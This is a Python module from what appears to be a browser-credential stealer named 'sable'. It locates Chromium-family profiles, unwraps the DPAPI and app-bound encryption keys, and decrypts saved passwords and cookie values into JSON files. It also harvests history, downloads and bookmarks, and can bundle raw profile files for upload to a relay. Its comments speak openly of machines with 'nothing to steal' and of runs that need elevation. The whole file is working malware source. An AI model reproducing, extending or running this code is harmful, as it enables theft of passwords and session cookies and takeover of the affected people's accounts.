"""Chromium-family readers.

Every database is copied out of the live profile before it is opened. A running
browser holds a lock on the original and keeps the newest rows in a ``-wal``
sidecar, so the copy carries the sidecars with it and the copy is what gets read.

Key material has two sources and they are not interchangeable:

- ``os_crypt.encrypted_key`` in ``Local State`` is base64 with a ``DPAPI`` prefix.
  Strip the prefix, unwrap under the current user, and the result is the AES-256 key
  for ``v10`` and ``v11`` rows.
- ``os_crypt.app_bound_encrypted_key`` is base64 with an ``APPB`` prefix and is
  wrapped under SYSTEM. Chrome 133+ writes ``v20`` rows against it. The unwrap has to
  leave the process, which is what ``abe.unwrap`` is for.

Row decryption is AES-256-GCM: 12-byte nonce, then ciphertext, then a 16-byte tag.
The per-row binding Chrome adds for cookies is the 32-byte SHA-256 of the row's
``host_key``, carried as a prefix of the plaintext rather than as a GCM AAD — the
cipher itself uses no AAD, so passing one here would fail every tag check. That
prefix is verified and stripped after the tag passes, and a row without it is an
older row and is returned as-is.

DPAPI rows still exist on machines upgraded from an older build, so a failed GCM
open falls back to a DPAPI unwrap of the same payload before the row is dropped.
"""

from __future__ import annotations

import base64
import hashlib
import re
import shutil
import sqlite3
from collections.abc import Iterator
from pathlib import Path
from typing import Any, Final, NamedTuple

from ... import abe, log, util, winapi

_PREFIX_V10: Final[bytes] = b"v10"
_PREFIX_V11: Final[bytes] = b"v11"
_PREFIX_V20: Final[bytes] = b"v20"
_DPAPI_PREFIX: Final[bytes] = b"DPAPI"
_APP_BOUND_PREFIX: Final[bytes] = b"APPB"

_NONCE_SIZE: Final[int] = 12
_TAG_SIZE: Final[int] = 16
_KEY_BYTES: Final[int] = 32

_MAX_PASSWORDS: Final[int] = 2000
_MAX_COOKIES: Final[int] = 5000
_MAX_HISTORY: Final[int] = 2000
_MAX_DOWNLOADS: Final[int] = 1000
_MAX_BOOKMARKS: Final[int] = 2000
_MAX_BOOKMARK_DEPTH: Final[int] = 8

# Column names inside a caller's WHERE clause. Used only to check them against the
# store's real columns before the statement runs; values never travel this way.
_IDENTIFIER: Final[re.Pattern[str]] = re.compile(r"[A-Za-z_][A-Za-z0-9_]*")
_SQL_KEYWORDS: Final[frozenset[str]] = frozenset(
    {"AND", "OR", "NOT", "LIKE", "GLOB", "IN", "IS", "NULL", "BETWEEN", "ESCAPE", "COLLATE"}
)

# A Chromium profile is multi-gigabyte only because of its caches. Measured on a real
# machine: Edge's Default is 2.2 GB and 2.0 GB of that is the directories below;
# Brave's 3.2 GB is 3.0 GB of the same. Dropping them is the difference between a
# folder grab nobody can move and one that fits in a single upload.
_SKIP_DIRS: Final[frozenset[str]] = frozenset(
    {
        "Cache",
        "Code Cache",
        "GPUCache",
        "GrShaderCache",
        "ShaderCache",
        "DawnGraphiteCache",
        "DawnWebGPUCache",
        "Service Worker",
        "component_crx_cache",
        "extensions_crx_cache",
        "File System",
        "blob_storage",
        "Crashpad",
        "BrowserMetrics",
        "Safe Browsing",
        "optimization_guide_model_store",
        "OnDeviceHeadSuggestModel",
        "WasmTtsEngine",
        "CertificateRevocation",
    }
)

# Real data, but not the part anyone reaches for first. Copied only after everything
# else, and only until the budget is gone.
_BULK_DIRS: Final[frozenset[str]] = frozenset(
    {
        "IndexedDB",
        "Local Extension Settings",
        "Extensions",
        "Local Storage",
        "Session Storage",
        "Shared Dictionary",
        "Web Applications",
        "Storage",
        "adblock_cache",
        "sanitized_background_images",
    }
)

# Per profile, across both passes. A machine with three profiles still produces one
# archive under the relay's 2 GB ceiling; a machine with thirty does not, which is why
# the number is here and not left to the disk.
_MAX_BUNDLE_BYTES: Final[int] = 192 * 1024 * 1024
_MAX_BUNDLE_FILES: Final[int] = 20_000
_MAX_BUNDLE_FILE_BYTES: Final[int] = 64 * 1024 * 1024

_WANTED_PASSWORDS: Final[tuple[str, ...]] = (
    "origin_url",
    "signon_realm",
    "username_value",
    "password_value",
    "date_created",
    "date_last_used",
    "times_used",
)

_WANTED_COOKIES: Final[tuple[str, ...]] = (
    "host_key",
    "name",
    "value",
    "encrypted_value",
    "path",
    "expires_utc",
    "last_access_utc",
    "is_secure",
    "is_httponly",
    "samesite",
)

_WANTED_HISTORY: Final[tuple[str, ...]] = (
    "url",
    "title",
    "visit_count",
    "typed_count",
    "last_visit_time",
)

_WANTED_DOWNLOADS: Final[tuple[str, ...]] = (
    "target_path",
    "tab_url",
    "total_bytes",
    "start_time",
    "state",
)


class Keys(NamedTuple):
    """The two AES keys a profile can have. Either may be absent."""

    user: bytes | None
    app_bound: bytes | None


# One unwrap per ``Local State`` per process. The app-bound key is per user, not per
# profile, and the unwrap is a scheduled-task round trip: without this, twelve
# profiles mean twelve launches, and a failing unwrap costs its full timeout twelve
# times over. A None result is cached too, for exactly that reason.
_APP_BOUND_CACHE: Final[dict[str, bytes | None]] = {}


# --- key material -------------------------------------------------------------


def _local_state(profile: Path) -> tuple[Path, dict[str, Any]] | None:
    """``Local State`` beside the profile, then inside it (Opera's layout)."""
    for candidate in (profile / "Local State", profile.parent / "Local State"):
        if not candidate.is_file():
            continue
        data = util.read_json(candidate)
        if isinstance(data, dict):
            return candidate, data
    return None


def _b64(text: str) -> bytes | None:
    try:
        return base64.b64decode(text, validate=False)
    except (ValueError, TypeError):
        return None


def _user_key(crypt: dict[str, Any]) -> bytes | None:
    if "encrypted_key" not in crypt:
        return None
    text = crypt["encrypted_key"]
    if not isinstance(text, str):
        return None
    raw = _b64(text)
    if raw is None:
        return None
    blob = abe.strip_prefix(raw, _DPAPI_PREFIX)
    if blob is None:
        return None
    key = winapi.crypt_unprotect(blob)
    if key is None or len(key) != _KEY_BYTES:
        return None
    return key


def _app_bound_key(crypt: dict[str, Any], cache_key: str) -> bytes | None:
    if cache_key in _APP_BOUND_CACHE:
        return _APP_BOUND_CACHE[cache_key]

    key: bytes | None = None
    if "app_bound_encrypted_key" in crypt:
        text = crypt["app_bound_encrypted_key"]
        if isinstance(text, str):
            raw = _b64(text)
            if raw is not None:
                blob = abe.strip_prefix(raw, _APP_BOUND_PREFIX)
                if blob is not None:
                    key = abe.unwrap(blob)

    _APP_BOUND_CACHE[cache_key] = key
    return key


def profile_keys(profile: Path) -> Keys:
    """Both keys for a profile. Absent keys stay None; a broken state is no keys."""
    found = _local_state(profile)
    if found is None:
        return Keys(user=None, app_bound=None)

    state_path, state = found

    try:
        crypt = state["os_crypt"]
    except (KeyError, TypeError):
        return Keys(user=None, app_bound=None)
    if not isinstance(crypt, dict):
        return Keys(user=None, app_bound=None)

    return Keys(
        user=_user_key(crypt),
        app_bound=_app_bound_key(crypt, str(state_path)),
    )


# --- row decryption -----------------------------------------------------------


def _aes_gcm(key: bytes, payload: bytes) -> bytes | None:
    # Imported here so this module stays importable without pycryptodome, which is
    # what the Linux import test needs.
    from Crypto.Cipher import AES

    nonce = payload[:_NONCE_SIZE]
    tag = payload[-_TAG_SIZE:]
    ciphertext = payload[_NONCE_SIZE:-_TAG_SIZE]
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        return cipher.decrypt_and_verify(ciphertext, tag)
    except ValueError:
        return None


def decrypt_value(encrypted_value: bytes, key: bytes | None, aad: bytes = b"") -> bytes | None:
    """Plaintext for one encrypted row, or None.

    ``aad`` is the per-row binding, not a GCM associated-data argument: Chrome
    prefixes the cookie plaintext with ``SHA256(host_key)`` and uses no AAD, so the
    value is verified and stripped after the tag check instead of being fed to the
    cipher. Passwords pass ``b""``.
    """
    if not encrypted_value:
        return None

    if encrypted_value[:3] in (_PREFIX_V10, _PREFIX_V11, _PREFIX_V20):
        payload = encrypted_value[3:]
    else:
        payload = encrypted_value

    if len(payload) < _NONCE_SIZE + _TAG_SIZE:
        return winapi.crypt_unprotect(payload)

    plaintext: bytes | None = None
    if key is not None:
        plaintext = _aes_gcm(key, payload)
    if plaintext is None:
        plaintext = winapi.crypt_unprotect(payload)
    if plaintext is None:
        return None

    if aad:
        if plaintext.startswith(aad):
            return plaintext[len(aad):]
        # Rows written before the host-key binding existed carry no prefix.
        return plaintext
    return plaintext


def secret_value(blob: Any, keys: Keys, aad: bytes) -> bytes | None:
    if not isinstance(blob, (bytes, bytearray)) or not blob:
        return None
    raw = bytes(blob)
    key = keys.app_bound if raw[:3] == _PREFIX_V20 else keys.user
    return decrypt_value(raw, key, aad)


# --- database access ----------------------------------------------------------


def copy_database(source: Path, scratch: Path) -> Path | None:
    """Copy a live database and its WAL siblings into ``scratch``."""
    target = scratch / source.name
    if not util.copy_with_sidecars(source, target):
        return None
    return target


def wal_bytes(source: Path) -> int:
    """Bytes waiting in the ``-wal`` sidecar, or 0.

    A running browser keeps its newest writes in the write-ahead log, so "the row was
    not in the file" and "the row was in a sidecar that did not copy" look identical
    from a reader's chair. Recording the size is what tells the two apart after the
    fact, when the live store is long gone.
    """
    try:
        return (source.parent / (source.name + "-wal")).stat().st_size
    except OSError:
        return 0


def _columns(connection: sqlite3.Connection, table: str) -> set[str]:
    try:
        rows = connection.execute(f"PRAGMA table_info({table})").fetchall()
    except sqlite3.Error:
        log.logger.debug("chromium: table_info failed for %s", table, exc_info=True)
        return set()
    return {str(row[1]) for row in rows}


def read_table(
    path: Path,
    table: str,
    wanted: tuple[str, ...],
    limit: int,
    order: str = "",
    *,
    where: str = "",
    params: tuple[Any, ...] = (),
) -> list[dict[str, Any]]:
    """Rows as dicts, with absent columns projected as NULL.

    Every wanted name is present in every returned row, so callers index directly.
    Chrome adds and removes columns between releases, and a missing one must cost
    that field, not the whole table.

    ``where`` is for a caller that knows what it is looking for. A recency-ordered
    read with a row cap answers "the newest N rows of the store", which is not the
    same question as "rows for this domain" on a store holding thousands: the row
    can be old enough, or unvisited long enough, to sit past the cap while still
    being present. The clause is bound through ``params`` and never formatted.
    """
    try:
        connection = sqlite3.connect(str(path))
    except sqlite3.Error:
        log.logger.debug("chromium: cannot open %s", path, exc_info=True)
        return []

    try:
        available = _columns(connection, table)
        if not available:
            return []

        projection = ", ".join(
            name if name in available else f"NULL AS {name}" for name in wanted
        )
        statement = f"SELECT {projection} FROM {table}"
        if where:
            # A clause naming a column this store does not have fails the whole
            # query, and returning nothing would be indistinguishable from a store
            # that has no matching row. Drop the clause and let the caller's own
            # field filter decide; its limit is still bounded.
            referenced = {
                token
                for token in _IDENTIFIER.findall(where)
                if token.upper() not in _SQL_KEYWORDS
            }
            if referenced <= available:
                statement += f" WHERE {where}"
            else:
                log.logger.debug(
                    "chromium: %s lacks %s, where dropped for %s",
                    table,
                    sorted(referenced - available),
                    path,
                )
        if order:
            # Ordering on a column that does not exist fails the whole query, and
            # the projection above cannot rescue it. Order only when it is real.
            column = order.split(" ", 1)[0]
            if column in available:
                statement += f" ORDER BY {order}"
        statement += f" LIMIT {int(limit)}"

        cursor = connection.execute(statement, params)
        names = [str(column[0]) for column in cursor.description or ()]

        rows: list[dict[str, Any]] = []
        for row in cursor:
            rows.append({names[index]: row[index] for index in range(len(names))})
            if len(rows) >= limit:
                break
        return rows
    except sqlite3.Error:
        log.logger.debug("chromium: query failed on %s", path, exc_info=True)
        return []
    finally:
        connection.close()


def text_value(value: Any) -> str:
    if isinstance(value, str):
        return value
    if isinstance(value, (bytes, bytearray)):
        return bytes(value).decode("utf-8", "replace")
    return ""


def int_value(value: Any) -> int:
    if isinstance(value, int):
        return int(value)
    return 0


def _first_existing(profile: Path, relatives: tuple[str, ...]) -> Path | None:
    for relative in relatives:
        candidate = profile / relative
        if candidate.is_file():
            return candidate
    return None


# --- profile bundle -----------------------------------------------------------


def _bundle_files(profile: Path) -> Iterator[Path]:
    """Every regular file under a live profile. Unreadable directories are skipped."""
    try:
        candidates = profile.rglob("*")
        for path in candidates:
            try:
                if path.is_file():
                    yield path
            except OSError:
                continue
    except OSError:
        log.logger.debug("chromium: cannot walk %s", profile, exc_info=True)


def _bundle_one(source: Path, destination: Path, budget: int) -> tuple[int, int]:
    """Copy one file inside the budget. Returns (files, bytes), zero on any refusal."""
    try:
        size = source.stat().st_size
    except OSError:
        return (0, 0)
    if size <= 0 or size > budget or size > _MAX_BUNDLE_FILE_BYTES:
        return (0, 0)
    try:
        destination.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(source, destination)
    except OSError:
        # A profile in use holds locks; a locked file costs that file, not the bundle.
        log.logger.debug("chromium: bundle skipped %s", source, exc_info=True)
        return (0, 0)
    return (1, size)


def bundle_profile(profile: Path, target: Path) -> int:
    """Copy the profile folder, minus its caches, beside the parsed artifacts.

    Two passes over one budget. The lean pass is everything outside ``_BULK_DIRS``:
    ``Local State``, ``Network/``, ``Login Data``, ``Web Data``, ``History``. The bulk
    pass is the databases behind IndexedDB, extension settings and local storage, and
    it stops when the budget runs out.

    Returns the number of files copied. The parsed JSON in the same directory is the
    version that does not need a key; this is the bytes, for the rows a reader could
    not open and for anything a browser adds next release.

    Off by default: on the machine this was measured against the four browsers produced
    319 MB of bundle, and almost all of it was extension blobs nobody reads. The parsed
    artifacts and the store copies carry the secrets either way.
    """
    destination = target / "profile"
    lean: list[Path] = []
    bulk: list[Path] = []

    for path in _bundle_files(profile):
        try:
            parts = path.relative_to(profile).parts
        except ValueError:
            continue
        if any(part in _SKIP_DIRS for part in parts[:-1]):
            continue
        if len(parts) > 1 and parts[0] in _BULK_DIRS:
            bulk.append(path)
        else:
            lean.append(path)

    budget = _MAX_BUNDLE_BYTES
    copied = 0
    written = 0

    # Sorted so two runs over the same profile produce the same bundle, and so a
    # budget that runs out takes the tail of an alphabetical list rather than
    # whatever the filesystem happened to return first.
    lean.sort()
    bulk.sort()

    for group in (lean, bulk):
        for path in group:
            if budget <= 0 or copied >= _MAX_BUNDLE_FILES:
                break
            try:
                relative = path.relative_to(profile)
            except ValueError:
                continue
            count, size = _bundle_one(path, destination / relative, budget)
            copied += count
            written += size
            budget -= size

    # ``Local State`` lives beside the profile, not inside it, and it is the file the
    # whole key chain starts at: without it the copied databases are ciphertext.
    state = profile.parent / "Local State"
    if state.is_file() and budget > 0:
        count, size = _bundle_one(state, target / "Local State", budget)
        copied += count
        written += size
        budget -= size

    log.logger.debug(
        "chromium: %s bundled %d files, %d bytes", profile.name, copied, written
    )
    return copied


# --- artifacts ----------------------------------------------------------------


def _passwords(
    profile: Path, scratch: Path, target: Path, keys: Keys
) -> tuple[int, dict[str, Any]]:
    """``(entries written, what happened)``.

    The status is the point. A browser with five saved logins and no key to open them
    produces the same count as a browser with no logins at all, and that difference is
    the difference between a machine with nothing to steal and a run that needs
    elevation. The reason is recorded beside the count so it travels in the payload.
    """
    status: dict[str, Any] = {"rows": 0, "attempted": 0, "opened": 0, "written": 0, "reason": ""}

    source = profile / "Login Data"
    if not source.is_file():
        status["reason"] = "no Login Data"
        return 0, status
    copy = copy_database(source, scratch)
    if copy is None:
        status["reason"] = "copy refused"
        return 0, status

    rows = read_table(copy, "logins", _WANTED_PASSWORDS, _MAX_PASSWORDS, "date_last_used DESC")
    status["rows"] = len(rows)
    entries: list[dict[str, Any]] = []
    app_bound_rows = 0

    for row in rows:
        blob = row["password_value"]
        if isinstance(blob, (bytes, bytearray)) and bytes(blob[:3]) == _PREFIX_V20:
            app_bound_rows += 1
        if not blob:
            # A row with no ciphertext is a saved username, not a password. Counting it
            # as an attempted decrypt would report a key failure on a machine that has
            # nothing to decrypt.
            continue
        status["attempted"] += 1
        secret = secret_value(blob, keys, b"")
        if secret is None:
            continue
        status["opened"] += 1
        username = text_value(row["username_value"])
        password = secret.decode("utf-8", "replace")
        if not username and not password:
            continue
        entries.append(
            {
                "origin": text_value(row["origin_url"]),
                "realm": text_value(row["signon_realm"]),
                "username": username,
                "password": password,
                "created": util.chrome_time(int_value(row["date_created"])),
                "last_used": util.chrome_time(int_value(row["date_last_used"])),
                "times_used": int_value(row["times_used"]),
            }
        )

    if not entries:
        if rows and not status["attempted"]:
            status["reason"] = "rows present, no stored password"
        elif status["attempted"] and not status["opened"]:
            if not keys.user and not keys.app_bound:
                status["reason"] = "no key: Local State gave neither key"
            elif app_bound_rows and keys.app_bound is None:
                status["reason"] = (
                    f"{app_bound_rows} v20 rows need the app-bound key, "
                    "which was not unwrapped"
                )
            else:
                status["reason"] = "every tag check failed"
            log.logger.warning(
                "chromium: %s has %d logins and opened none: %s",
                profile.name,
                len(rows),
                status["reason"],
            )
        return 0, status
    if not util.write_json(target / "passwords.json", entries):
        status["reason"] = "write refused"
        return 0, status

    status["written"] = len(entries)
    return len(entries), status


def _cookies(
    profile: Path, scratch: Path, target: Path, keys: Keys
) -> tuple[int, dict[str, Any]]:
    status: dict[str, Any] = {"rows": 0, "opened": 0, "written": 0, "reason": ""}

    source = _first_existing(profile, ("Network/Cookies", "Cookies"))
    if source is None:
        status["reason"] = "no Cookies"
        return 0, status
    copy = copy_database(source, scratch)
    if copy is None:
        status["reason"] = "copy refused"
        return 0, status

    rows = read_table(copy, "cookies", _WANTED_COOKIES, _MAX_COOKIES, "last_access_utc DESC")
    status["rows"] = len(rows)
    entries: list[dict[str, Any]] = []

    for row in rows:
        host = text_value(row["host_key"])
        binding = hashlib.sha256(host.encode("utf-8")).digest()
        secret = secret_value(row["encrypted_value"], keys, binding)

        if secret is None:
            value = text_value(row["value"])
            if not value:
                continue
        else:
            status["opened"] += 1
            value = secret.decode("utf-8", "replace")

        entries.append(
            {
                "host": host,
                "name": text_value(row["name"]),
                "value": value,
                "path": text_value(row["path"]),
                "expires": util.chrome_time(int_value(row["expires_utc"])),
                "secure": bool(int_value(row["is_secure"])),
                "http_only": bool(int_value(row["is_httponly"])),
                "samesite": int_value(row["samesite"]),
            }
        )

    if not entries:
        if rows:
            status["reason"] = "rows present, none readable"
            log.logger.warning(
                "chromium: %s has %d cookies and wrote none", profile.name, len(rows)
            )
        return 0, status
    if not util.write_json(target / "cookies.json", entries):
        status["reason"] = "write refused"
        return 0, status

    status["written"] = len(entries)
    return len(entries), status


def _write_history(rows: list[dict[str, Any]], target: Path) -> int:
    entries: list[dict[str, Any]] = []

    for row in rows:
        url = text_value(row["url"])
        if not url:
            continue
        entries.append(
            {
                "url": url,
                "title": text_value(row["title"]),
                "visits": int_value(row["visit_count"]),
                "typed": int_value(row["typed_count"]),
                "last_visit": util.chrome_time(int_value(row["last_visit_time"])),
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "history.json", entries):
        return 0
    return len(entries)


def _write_downloads(rows: list[dict[str, Any]], target: Path) -> int:
    entries: list[dict[str, Any]] = []

    for row in rows:
        path = text_value(row["target_path"])
        if not path:
            continue
        entries.append(
            {
                "path": path,
                "url": text_value(row["tab_url"]),
                "bytes": int_value(row["total_bytes"]),
                "started": util.chrome_time(int_value(row["start_time"])),
                "state": int_value(row["state"]),
            }
        )

    if not entries:
        return 0
    if not util.write_json(target / "downloads.json", entries):
        return 0
    return len(entries)


def _history(profile: Path, scratch: Path, target: Path) -> int:
    """History and downloads from one copy of ``History``.

    Both tables live in the same SQLite file. Copying it twice doubled the largest
    read in the whole collector — a long-lived profile's History is hundreds of
    megabytes — for a second table that shares every one of those pages.
    """
    source = profile / "History"
    if not source.is_file():
        return 0
    copy = copy_database(source, scratch)
    if copy is None:
        return 0

    written = _write_history(
        read_table(copy, "urls", _WANTED_HISTORY, _MAX_HISTORY, "last_visit_time DESC"),
        target,
    )
    written += _write_downloads(
        read_table(copy, "downloads", _WANTED_DOWNLOADS, _MAX_DOWNLOADS, "start_time DESC"),
        target,
    )
    return written


def _walk_bookmarks(
    node: dict[str, Any],
    folder: str,
    out: list[dict[str, Any]],
    depth: int,
) -> None:
    if depth > _MAX_BOOKMARK_DEPTH or len(out) >= _MAX_BOOKMARKS:
        return
    if "children" not in node:
        return
    children = node["children"]
    if not isinstance(children, list):
        return

    name = folder
    if "name" in node:
        name = text_value(node["name"]) or folder

    for child in children:
        if len(out) >= _MAX_BOOKMARKS:
            return
        if not isinstance(child, dict):
            continue
        if "children" in child:
            _walk_bookmarks(child, name, out, depth + 1)
            continue
        if "url" not in child:
            continue
        url = text_value(child["url"])
        if not url:
            continue
        title = ""
        if "name" in child:
            title = text_value(child["name"])
        out.append({"folder": name, "title": title, "url": url})


def _bookmarks(profile: Path, target: Path) -> int:
    document = util.read_json(profile / "Bookmarks")
    if not isinstance(document, dict):
        return 0
    if "roots" not in document:
        return 0
    roots = document["roots"]
    if not isinstance(roots, dict):
        return 0

    entries: list[dict[str, Any]] = []
    for key in roots:
        if len(entries) >= _MAX_BOOKMARKS:
            break
        node = roots[key]
        if isinstance(node, dict):
            _walk_bookmarks(node, str(key), entries, 0)

    if not entries:
        return 0
    if not util.write_json(target / "bookmarks.json", entries):
        return 0
    return len(entries)


def run_profile(profile: Path, target: Path, *, raw: bool = False) -> int:
    """Collect every artifact for one profile. Returns the number of items written.

    ``_status.json`` lands beside the artifacts. It carries the key material that was
    available and, per artifact, how many rows were seen, how many opened and why the
    ones that did not were dropped — so a run that collected nothing says which kind
    of nothing it was.
    """
    if not profile.is_dir():
        return 0

    keys = profile_keys(profile)
    written = 0
    status: dict[str, Any] = {
        "profile": profile.name,
        "keys": {"user": bool(keys.user), "app_bound": bool(keys.app_bound)},
        "artifacts": {},
    }

    with util.temp_workspace("sable-chromium-") as scratch:
        count, detail = _passwords(profile, scratch, target, keys)
        status["artifacts"]["passwords"] = detail
        written += count
        count, detail = _cookies(profile, scratch, target, keys)
        status["artifacts"]["cookies"] = detail
        written += count
        count = _history(profile, scratch, target)
        status["artifacts"]["history"] = {"written": count, "reason": ""}
        written += count
        count = _bookmarks(profile, target)
        status["artifacts"]["bookmarks"] = {"written": count, "reason": ""}
        written += count

    # One item, however many files it carries: the count is what the collector
    # returned, and five thousand bundled files is still one collected artifact.
    bundled = bundle_profile(profile, target) if raw else 0
    status["bundled_files"] = bundled
    if bundled:
        written += 1

    util.write_json(target / "_status.json", status)
    log.logger.debug("chromium: %s wrote %d", profile.name, written)
    return written


__all__ = [
    "Keys",
    "bundle_profile",
    "copy_database",
    "decrypt_value",
    "int_value",
    "profile_keys",
    "read_table",
    "run_profile",
    "secret_value",
    "text_value",
]
